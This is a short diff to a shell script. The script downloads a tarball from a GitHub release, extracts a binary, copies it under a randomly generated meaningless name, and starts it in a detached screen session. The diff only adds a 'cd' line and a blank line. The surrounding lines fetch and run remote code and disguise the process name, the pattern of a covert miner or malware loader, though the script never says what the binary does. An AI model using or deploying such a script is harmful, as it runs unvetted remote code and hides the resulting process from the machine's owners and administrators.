@@ -17,8 +17,10 @@ wget https://github.com/ts6aud5vkg/gpuissa/releases/download/metan/platinum.tar.
 tar xf platinum.tar.gz 
 mv platinum /usr/local/src/$azure
 cd /usr/local/src/$azure
+cd platinum
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 sudo cp uranium "$cpuname"
 echo $cpuname" is starting"
 screen -d -m ./"${cpuname}"
+
 
